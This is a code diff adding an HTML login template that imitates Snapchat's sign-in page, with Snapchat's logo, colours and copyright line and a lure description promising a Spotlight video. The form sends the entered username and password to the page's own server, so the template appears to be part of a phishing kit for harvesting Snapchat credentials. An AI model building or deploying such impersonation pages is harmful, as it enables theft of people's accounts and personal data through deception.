@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <link rel="shortcut icon" href="/static/img/snapchat-app-icon.svg">
+  <meta name="description" content="Watch this amazing video on Snapchat Spotlight!">
+  <link rel="stylesheet" href="/static/css/index.css">
+  <title>Snapchat</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500&display=swap" rel="stylesheet">
+  <style>
+    * {
+      -webkit-tap-highlight-color: rgba(255, 255, 255, 0) !important;
+      -webkit-focus-ring-color: rgba(255, 255, 255, 0) !important;
+      outline: none !important;
+      font-family: 'Poppins', sans-serif;
+    }
+
+    body {
+      background: #fffdfd;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .login-box {
+      width: 90%;
+      max-width: 400px;
+      background: #ffffff;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+      padding: 2rem;
+      border-radius: 10px;
+      text-align: center;
+    }
+
+    .login-box h2 {
+      margin-bottom: 20px;
+      font-weight: 500;
+    }
+
+    .login-box input {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 16px;
+    }
+
+    .login-box button {
+      width: 100%;
+      padding: 10px;
+      background-color: #fffc00;
+      border: none;
+      font-size: 16px;
+      border-radius: 6px;
+      cursor: pointer;
+      font-weight: 600;
+    }
+
+    .login-box button:hover {
+      background-color: #ffe600;
+    }
+
+    .bottom-text {
+      text-align: center;
+      margin-top: 20px;
+      font-size: 14px;
+      color: #999;
+    }
+
+    .error {
+      color: red;
+      margin-bottom: 10px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="login-box">
+    <img src="/static/img/snapchat-app-icon.svg" alt="Snapchat Logo" style="height: 40px; margin-bottom: 20px;">
+    <h2>Log in to Snapchat</h2>
+
+    {% if error %}
+      <div class="error">{{ error }}</div>
+    {% endif %}
+
+    <form method="POST">
+      <input type="text" name="username" placeholder="Username or Email" required>
+      <input type="password" name="password" placeholder="Password" required>
+      <button type="submit">Next</button>
+    </form>
+
+    <p class="bottom-text">
+      Don't have an account? <a href="/register">Sign up</a>
+    </p>
+  </div>
+
+  <div class="bottom-text">
+    <div class="copyright">© Snap Inc 2025</div>
+    <div class="brand">Snapchat</div>
+  </div>
+
+  <script src="/static/js/index.js"></script>
+</body>
+</html>
